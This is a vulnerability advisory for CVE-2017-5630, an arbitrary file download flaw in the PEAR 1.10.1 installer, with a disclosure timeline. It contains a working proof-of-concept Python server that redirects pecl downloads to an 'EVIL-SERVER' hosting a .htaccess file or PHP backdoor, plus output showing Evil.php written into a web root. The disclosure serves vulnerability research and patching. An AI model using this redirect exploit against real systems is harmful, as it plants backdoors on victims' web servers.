@@ -1,0 +1,140 @@
+[+]#############################################################################################
+[+] Credits / Discovery: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/PEAR-ARBITRARY-FILE-DOWNLOAD.txt
+[+] ISR: ApparitionSEC
+[+]#############################################################################################
+
+
+
+Vendor:
+============
+pear.php.net
+
+
+
+Product:
+===================================
+PEAR Base System v1.10.1
+PEAR Installer's download utility
+
+
+
+Vulnerability Type:
+=======================
+Arbitrary File Download
+
+
+
+CVE Reference:
+==============
+CVE-2017-5630
+
+
+
+Security Issue:
+================
+
+The download utility class in the Installer in PEAR Base System v1.10.1, does not validate file types and filenames after a redirect,
+which allows remote HTTP servers to overwrite files via crafted responses, as demonstrated by a .htaccess overwrite.
+
+e.g.
+
+pecl download <http://some-vuln-server/file.tgz> 
+
+PEAR does not rename the arbitrary invalid file to the originally requested (safe) filename.
+Therefore, attackers can overwrite files or download a backdoor if the PECL request is made from from web accesible directory etc..
+
+Moreover, PECL doesn't delete these invalid files upon download, giving the attacker time to exploit it if attackers
+can force the HTTP connection to stay open, and before a "invalid file message" is noticed.
+
+POC Video:
+https://vimeo.com/201341280
+
+
+Proof of concept:
+This POC involves 3 machines:
+First machine is victim making a PECL download command request
+Second is the vuln server receiving the file download request
+Third is the malicious server hosting the PHP backdoor, .htaccess file etc.
+===========================================================================
+
+1) Victim machine attempts to download a legit ".tgz" archive.
+
+pecl download http://VULN-SERVER:8080/Test.tgz
+
+
+2) VULN-SERVER where the victim is requesting "Test.tgz", and attacker controls HTTP response.
+
+
+3) EVIL-SERVER where PECL follows and downloads 'unintended' Evil.php backdoor.
+python -m SimpleHTTPServer 8888
+
+
+On VULN-SERVER run "PECL-File-Exploit.py"
+
+python PECL-File-Exploit.py 
+
+
+import socket
+
+HOST='localhost'
+PORT=8080
+TARGET='http://EVIL-SERVER:8888/'
+FILE='.htaccess'
+s = socket.socket()
+s.bind((HOST, PORT))
+s.listen(10)
+
+print 'Waiting for PECL connections...'
+
+
+while True:
+    conn, addr = s.accept()
+    junk = conn.recv(512) 
+    conn.send('HTTP/1.1 302 Found\r\n')
+    conn.send('Location: '+TARGET+FILE+'\r\n')
+    conn.close()
+s.close()
+
+
+
+Then, make request for Test.tgz...
+
+C:\xampp\htdocs\webapp>pecl download http://VULN-SERVER:8080/Test.tgz
+
+downloading Evil.php ...
+Starting to download Evil.php (4,665 bytes)
+.....done: 4,665 bytes
+File C:\xampp\htdocs\webapp\Evil.php downloaded
+
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification: January 11, 2017
+Informed "PECL package no longer maintained" : January 23, 2017
+Opened Bug #2117 : January 25, 2017
+January 29, 2017 : Public Disclosure
+
+
+
+Network Access:
+================
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. 
